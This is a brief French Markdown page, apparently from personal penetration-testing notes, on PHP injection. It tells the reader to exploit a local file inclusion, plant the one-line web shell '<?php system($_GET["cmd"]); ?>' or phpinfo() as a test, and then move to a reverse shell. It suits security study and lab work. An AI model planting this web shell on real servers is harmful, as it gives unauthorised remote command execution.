<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](web_server.md)</sub>
#PHP

**Présentation :** Language serveur

**Injection PHP :**
- Réaliser une [LFI](lfi.md)
  - Premier test, contenu du fichier : 
    - *<?php system($_GET["cmd"]); ?>* : si on passe cmd en param ça donne une rép.
    - ou *<?php phpinfo(); ?>*
  - Si premier test OK => [reverse shell](reverse_shell.md)
  